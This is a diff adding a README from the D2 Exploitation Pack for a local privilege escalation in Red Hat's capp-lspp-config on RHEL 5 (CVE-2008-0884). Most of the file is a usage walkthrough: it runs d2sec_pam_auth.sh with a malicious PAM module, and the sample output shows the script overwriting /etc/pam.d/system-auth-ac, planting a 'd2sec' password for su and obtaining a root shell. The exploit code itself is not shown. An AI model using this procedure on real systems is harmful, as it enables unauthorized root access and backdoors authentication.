@@ -1,0 +1,38 @@
+D2 Exploitation Pack
+====================
+
+Copyright (c) 2007 DSquare Security, LLC
+
+
+License information
+-------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Local exploit
+---------------
+
+Red Hat 'capp-lspp-config' Local Privilege Escalation Vulnerability
+
+Tested on RHEL 5
+
+CVE Name : CVE-2008-0884
+CVE URL  : http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0884
+
+How to use the exploit
+------------------------
+
+$ ./d2sec_pam_auth.sh ./d2sec_pam_unix.so 
+D2SEC (C) 2007-2008 Red Hat 'capp-lspp-config' Exploit
+
+[+] backup /etc/pam.d/system-auth-ac in /dev/shm/system-auth-ac.o
+[+] overwrite /etc/pam.d/system-auth-ac
+[#] run su with 'd2sec' password
+[!] don't forget to delete ./d2sec_pam_unix.so and to restore /etc/pam.d/system-auth-ac with /dev/shm/system-auth-ac.o
+[compaq@localhost ~]$ su
+Mot de passe : 
+[root@localhost compaq]# id
+uid=0(root) gid=0(root) groupes=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=user_u:system_r:unconfined_t
+
